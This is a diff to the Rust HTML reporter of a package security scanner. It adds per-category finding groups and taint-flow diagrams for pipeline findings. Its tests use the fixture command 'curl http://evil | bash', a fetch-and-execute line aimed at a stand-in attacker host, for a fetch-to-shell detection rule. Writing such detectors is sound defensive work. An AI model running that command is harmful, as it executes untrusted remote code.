@@ -1,5 +1,7 @@
+use std::collections::BTreeMap;
+
 use anyhow::{Context, Result};
-use skill_veil_core::ScanResult;
+use skill_veil_core::{Finding, ScanResult};
 
 pub(crate) fn format_json_output(results: &[ScanResult]) -> Result<String> {
     let reports: Vec<_> = results
@@ -116,7 +118,14 @@ th{color:#9aa0a6;font-weight:600}\
 td.sev{font-weight:700;white-space:nowrap}\
 .s-critical{color:#ff6b81}.s-high{color:#ff9e6b}.s-medium{color:#ffd66b}.s-low{color:#8ab4f8}\
 code{background:#0f1115;border:1px solid #2a2f3a;border-radius:4px;padding:.05rem .35rem;font-size:.85em}\
-.empty{padding:1rem;color:#9aa0a6}";
+.empty{padding:1rem;color:#9aa0a6}\
+.group{border-top:1px solid #2a2f3a}\
+.group>summary{cursor:pointer;padding:.55rem 1rem;color:#cbd2da;font-weight:600;list-style:none}\
+.group>summary::-webkit-details-marker{display:none}\
+.flow{display:flex;flex-wrap:wrap;align-items:center;gap:.4rem;padding:.35rem 0}\
+.stage{background:#0f1115;border:1px solid #3a4150;border-radius:6px;padding:.12rem .5rem;font-family:ui-monospace,SFMono-Regular,monospace;font-size:.78rem}\
+.stage.src{border-color:#ff9e6b}.stage.sink{border-color:#ff6b81}\
+.arrow{color:#ff6b81;font-weight:700}";
 
 /// Render a self-contained interactive HTML report: a header summary plus
 /// one collapsible `<details>` per package with a severity-coloured
@@ -168,41 +177,102 @@ pub(crate) fn format_html_output(results: &[ScanResult]) -> String {
             "<div class=\"empty\" style=\"padding-top:0\">{path}</div>"
         ));
 
-        if r.findings.is_empty() {
-            body.push_str("<div class=\"empty\">No findings.</div>");
-        } else {
-            body.push_str(
-                "<table><thead><tr><th>Severity</th><th>Rule</th><th>Category</th>\
-                 <th>Reason</th><th>Location</th></tr></thead><tbody>",
-            );
-            for f in &r.findings {
-                let loc = f.line_number.map_or_else(
-                    || {
-                        f.artifact_path
-                            .as_deref()
-                            .map(html_escape)
-                            .unwrap_or_default()
-                    },
-                    |line| format!("line {line}"),
-                );
-                body.push_str(&format!(
-                    "<tr><td class=\"sev {}\">{}</td><td><code>{}</code></td><td>{}</td>\
-                     <td>{}</td><td>{}</td></tr>",
-                    severity_css_class(f.severity),
-                    html_escape(&f.severity.to_string()),
-                    html_escape(&f.rule_id),
-                    html_escape(&f.category.to_string()),
-                    html_escape(&f.reason),
-                    loc,
-                ));
-            }
-            body.push_str("</tbody></table>");
-        }
+        render_package_findings(&mut body, &r.findings);
         body.push_str("</details>");
     }
 
     body.push_str("</body></html>");
     body
+}
+
+fn is_pipeline_finding(rule_id: &str) -> bool {
+    rule_id.starts_with("PIPELINE_")
+}
+
+/// Render a pipeline's `match_value` as a left-to-right taint-flow diagram:
+/// each `|`-separated stage becomes a box, the first marked as the source
+/// and the last as the sink, joined by arrows.
+fn render_taint_flow(pipeline: &str) -> String {
+    let stages: Vec<&str> = pipeline
+        .split('|')
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .collect();
+    if stages.len() < 2 {
+        return String::new();
+    }
+    let mut out = String::from("<div class=\"flow\">");
+    let last = stages.len() - 1;
+    for (i, stage) in stages.iter().enumerate() {
+        if i > 0 {
+            out.push_str("<span class=\"arrow\">&rarr;</span>");
+        }
+        let cls = if i == 0 {
+            "stage src"
+        } else if i == last {
+            "stage sink"
+        } else {
+            "stage"
+        };
+        out.push_str(&format!(
+            "<span class=\"{cls}\">{}</span>",
+            html_escape(stage)
+        ));
+    }
+    out.push_str("</div>");
+    out
+}
+
+/// Render a package's findings as collapsible per-category correlation
+/// groups, each a severity-coloured table. Pipeline findings additionally
+/// render their taint-flow diagram inline.
+fn render_package_findings(body: &mut String, findings: &[Finding]) {
+    if findings.is_empty() {
+        body.push_str("<div class=\"empty\">No findings.</div>");
+        return;
+    }
+    let mut groups: BTreeMap<String, Vec<&Finding>> = BTreeMap::new();
+    for f in findings {
+        groups.entry(f.category.to_string()).or_default().push(f);
+    }
+    for (category, group) in &groups {
+        body.push_str(&format!(
+            "<details class=\"group\" open><summary>{} ({})</summary>",
+            html_escape(category),
+            group.len()
+        ));
+        body.push_str(
+            "<table><thead><tr><th>Severity</th><th>Rule</th><th>Reason</th>\
+             <th>Location</th></tr></thead><tbody>",
+        );
+        for f in group {
+            let loc = f.line_number.map_or_else(
+                || {
+                    f.artifact_path
+                        .as_deref()
+                        .map(html_escape)
+                        .unwrap_or_default()
+                },
+                |line| format!("line {line}"),
+            );
+            let flow = if is_pipeline_finding(&f.rule_id) {
+                render_taint_flow(&f.match_value)
+            } else {
+                String::new()
+            };
+            body.push_str(&format!(
+                "<tr><td class=\"sev {}\">{}</td><td><code>{}</code></td><td>{}{}</td>\
+                 <td>{}</td></tr>",
+                severity_css_class(f.severity),
+                html_escape(&f.severity.to_string()),
+                html_escape(&f.rule_id),
+                html_escape(&f.reason),
+                flow,
+                loc,
+            ));
+        }
+        body.push_str("</tbody></table></details>");
+    }
 }
 
 #[cfg(test)]
@@ -252,5 +322,32 @@ mod tests {
         assert!(html.starts_with("<!doctype html>"));
         assert!(html.ends_with("</body></html>"));
         assert!(html.contains("0 package(s)"));
+    }
+
+    #[test]
+    fn pipeline_flow_renders_source_and_sink_stages() {
+        let flow = render_taint_flow("curl http://evil | bash");
+        assert!(flow.contains("class=\"stage src\""));
+        assert!(flow.contains("class=\"stage sink\""));
+        assert!(flow.contains("&rarr;"));
+        assert!(flow.contains("bash"));
+    }
+
+    #[test]
+    fn flow_escapes_stage_text() {
+        let flow = render_taint_flow("curl <x> | bash");
+        assert!(!flow.contains("<x>"));
+        assert!(flow.contains("&lt;x&gt;"));
+    }
+
+    #[test]
+    fn single_stage_has_no_flow_diagram() {
+        assert!(render_taint_flow("just one command").is_empty());
+    }
+
+    #[test]
+    fn is_pipeline_finding_matches_prefix() {
+        assert!(is_pipeline_finding("PIPELINE_FETCH_TO_SHELL"));
+        assert!(!is_pipeline_finding("BYTECODE_PYC_SOURCELESS"));
     }
 }
